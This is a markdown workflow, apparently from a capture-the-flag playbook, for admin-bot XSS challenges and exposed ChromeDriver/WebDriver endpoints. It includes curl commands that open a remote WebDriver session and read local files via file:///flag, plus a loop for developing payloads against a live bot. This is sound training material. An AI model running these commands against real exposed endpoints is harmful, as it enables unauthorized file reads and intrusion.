# Workflow — the ordered run from detection to confirmed payload

## Step 0 — which use is this

```
admin bot + client-side payload  -> debugging aid (local bot)
WebDriver endpoint exposed        -> attack surface (file read)
both                              -> rare, do the surface first
```

## Step 1 — check the driver exists

```bash
which chromedriver
chromedriver --version      # must match the browser's major version
which chromium google-chrome chromium-browser
```

No driver -> `curl` only if a remote endpoint is exposed, else install
or use the raw protocol against a local driver you do have. A missing
driver fails at session creation, not the payload.

## Step 2 — detect

```bash
# is a WebDriver endpoint exposed by the challenge?
curl -s -X POST http://TARGET:9515/session \
  -H 'Content-Type: application/json' \
  -d '{"capabilities":{"alwaysMatch":{"browserName":"chrome"}}}'
```

`sessionId` in the response -> the endpoint is exposed (attack-
surface branch). Refused/404 -> the debugging-aid branch.

## Step 3 — debugging aid: reproduce the bot

1. read the bot's source when supplied — URL, credential, wait, flags
2. stand up a local copy of the app (handout / docker compose)
3. run a local headless browser with the same flags and wait
4. navigate to the same page the live bot visits
5. verify the rendered page matches what the live flow produces

## Step 4 — the payload development loop

```python
page.on("console",   lambda m: print("CONSOLE:", m.text))
page.on("pageerror", lambda e: print("PAGEERROR:", e))
page.on("request",   lambda r: print("REQ:", r.method, r.url))
```

- canary first -> prove execution
- iterate on the four channels until the full payload fires
- match the bot's wait before judging a payload dead

## Step 5 — attack surface: the read primitive

```bash
curl -s -X POST .../session/$S/url -d '{"url":"file:///flag"}'
curl -s .../session/$S/source
```

The read is a capability -> `../file-read-primitives/` for what to
read next (source, config, flag path, keys).

## Step 6 — fire and confirm

- debugging aid: fire the confirmed payload at the live bot once, watch
  the listener for the flag-shaped value
- attack surface: the `file://` source response carries the flag

Either way the flag-shaped string goes through `tools/hooks.py
pre-flag` against the live response.

## Step 7 — clean up

- `DELETE /session` every session you created (local and remote)
- kill any local browser/driver processes you launched
- record the working payload and the channel in the notes

## The escalation rungs

When the debugging loop stalls (payload will not fire locally):

- is the reproduction wrong? -> re-check bot flags/wait/cookie/context
- is the injection context wrong? -> `../web-xss/` for context work
- is the channel wrong? -> tunnel interstitial, egress filter, CSP
- is the challenge not a bot challenge at all? -> `../web-ssrf/` if the
  "bot" is actually a server fetch, `../file-read-primitives/` if the
  goal is a file

When the attack-surface read stalls -> the falsifier is met; pivot to
`../file-read-primitives/` or `../web-ssrf/` for the same read goal.
